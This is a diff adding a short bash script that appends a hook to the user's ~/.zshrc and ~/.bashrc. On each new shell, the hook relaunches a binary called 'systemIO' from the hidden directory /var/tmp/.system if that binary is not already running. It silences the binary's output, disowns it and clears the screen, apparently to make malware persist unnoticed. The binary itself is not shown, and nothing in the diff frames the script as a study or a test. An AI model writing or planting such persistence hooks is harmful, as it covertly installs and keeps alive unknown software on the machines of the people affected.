@@ -1,0 +1,10 @@
+#!/bin/bash
+ls -a ~/ | grep 'zshrc' &> /dev/null
+if [ $? = 0 ]; then
+        echo -e "qwerty=\$(ps -a | grep systemIO)\nif [ \! -z \"\$qwerty\" ]; then\n\tclear\nelse\n\t/var/tmp/.system/systemIO/./systemIO </dev/null &>/dev/null &\n\tdisown\n\tclear\nfi" >> ~/.zshrc
+fi
+
+ls -a ~/ | grep 'bashrc' &> /dev/null
+if [ $? = 0 ]; then
+        echo -e "qwerty=\$(ps -a | grep systemIO)\nif [ \! -z \"\$qwerty\" ]; then\n\tclear\nelse\n\t/var/tmp/.system/systemIO/./systemIO </dev/null &>/dev/null &\n\tdisown\n\tclear\nfi" >> ~/.bashrc
+fi
